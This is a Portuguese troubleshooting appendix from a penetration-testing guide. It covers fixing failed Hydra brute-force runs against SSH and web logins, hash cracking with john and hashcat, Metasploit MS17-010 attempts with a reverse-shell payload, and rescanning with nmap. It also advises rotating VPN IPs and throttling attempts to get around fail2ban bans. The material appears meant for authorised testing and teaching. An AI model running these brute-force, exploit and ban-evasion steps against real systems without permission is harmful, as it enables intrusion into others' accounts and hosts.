## Apêndice C — O que fazer se NADA funcionar

Às vezes, TUDO dá errado. Aqui está o que fazer em cada cenário:

### Cenário 1: "Hydra retorna 0 valid passwords em segundos"

```bash
# 1. Verifique se há tentativas ACONTECENDO (modo verbose)
hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/Top1000.txt -t 2 -f -v ssh://10.0.0.1

# 2. Teste se o serviço aceita conexão alguma
ncat -v 10.0.0.1 22
# Se não conectar → IP/porta errada ou firewall

# 3. Teste MANUALMENTE com uma senha conhecida
ssh admin@10.0.0.1
# Se nem a senha certa funciona → problema não é o Hydra

# 4. Suspeite de bloqueio: mude de IP (VPN) e espere 30min
```

**Alternativa:** valide a wordlist: `wc -l wordlist.txt` — se for 0, o caminho está errado.

### Cenário 2: "Hydra HTTP acha em TUDO (falso positivo)"

```bash
# 1. A string de FALHA (F=) está errada — o Hydra nunca vê "falha"
#    Erre o login manualmente e copie a mensagem EXATA:
curl -s -X POST http://evilcorp.com/login -d "username=admin&password=ERRADA"

# 2. Use S= (sucesso) em vez de F= (falha):
hydra -l admin -P wordlist.txt evilcorp.com http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Bem-vindo"

# 3. Ou confirme no navegador: o que MUDA entre certo e errado?
#    (redirect diferente? cookie? texto?)
```

### Cenário 3: "Nenhum hash quebra"

```bash
# 1. Confirme o formato
hashid 'seu_hash'
grep -E "^[a-f0-9]{32}$" hashes.txt   # sobrou só MD5 válidos?

# 2. Rode com regras (multiplica a wordlist)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# 3. Tente a wordlist do alvo
hashcat -m 0 hashes.txt 15-alimentacao/wordlist-bruteforce.txt -r /usr/share/hashcat/rules/best64.rule

# 4. Se esgotou tudo: a senha é forte. DOCUMENTE:
echo "Hash X: não crackeável com wordlists atuais (rockyou + best64)" >> 18-cracking/hashes-crackeados.md
```

**Resultado válido:** "não crackeado" é um achado legítimo — não invente sucesso.

### Cenário 4: "Metasploit: exploit completed, no session created"

```bash
# 1. Confirme a vulnerabilidade ANTES
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS 10.0.0.1
msf6 > run
# "NOT vulnerable"? O exploit nunca vai funcionar.

# 2. Verifique o LHOST (seu IP real do lab)
ip addr show        # não use o IP da VPN se o alvo é local
msf6 > set LHOST 192.168.1.100

# 3. Teste payload mais simples
msf6 > set PAYLOAD windows/x64/shell/reverse_tcp

# 4. Verifique se o alvo conecta DE VOLTA para você
#    (netcat escutando + testar do alvo)
```

### Cenário 5: "Não encontrei NENHUM vetor de ataque"

```bash
# 1. Revise a Fase 1 — os dados importaram mesmo?
ls -la 15-alimentacao/
wc -l 15-alimentacao/alvos-servicos.txt

# 2. Confira se há serviços de login
cat 15-alimentacao/alvos-servicos.txt | grep -iE "ssh|ftp|smb|rdp|http"

# 3. Confira logins web
cat 15-alimentacao/alvos-login-web.txt

# 4. Sem nada? Rode um scan novo pontual
nmap -sV -p- -oN 02-enum/nmap-services.txt 10.0.0.1

# 5. Alvo realmente protegido → documente:
echo "- Alvo sem serviços de login expostos e sem CVEs exploráveis" >> 21-relatorio/relatorio-exploracao.md
```

### Cenário 6: "Fui banido / IP bloqueado no meio"

```bash
# 1. Pare TODOS os ataques imediatamente
pkill hydra; pkill msfconsole

# 2. Mude de IP
nordvpn disconnect && nordvpn connect
curl -s https://ifconfig.me    # confirme IP novo

# 3. Espere (fail2ban usa janelas de tempo: 10min, 1h, 24h)

# 4. Reduza a agressividade ao voltar:
hydra -t 1 -W 5 -f ...   # 1 tentativa, 5s espera

# 5. Se banimento for do alvo (não ISP): troque de alvo/vetor e volte depois
```

### Cenário 7: "Scripts standalone não rodam (Python)"

```bash
# 1. Leia o script — é Python 2 ou 3?
head -5 script.py    # print sem parênteses = Python 2

# 2. Tente com python2 (se disponível)
python2 script.py 10.0.0.1

# 3. Ou adapte: print() e imports para Python 3
nano script.py

# 4. Prefira sempre o exploit do Metasploit quando existir (mais suporte)
```

### Regra de ouro quando tudo falha

> **Se uma ferramenta não funciona, use a ALTERNATIVA da tabela do Apêndice B. Se a alternativa também não funciona, documente o erro e AVANÇE para a próxima fase. Nunca pare uma fase inteira por causa de UMA ferramenta quebrada.** Um relatório honesto com "tentado X, resultado Y" vale mais que sucesso inventado.

---
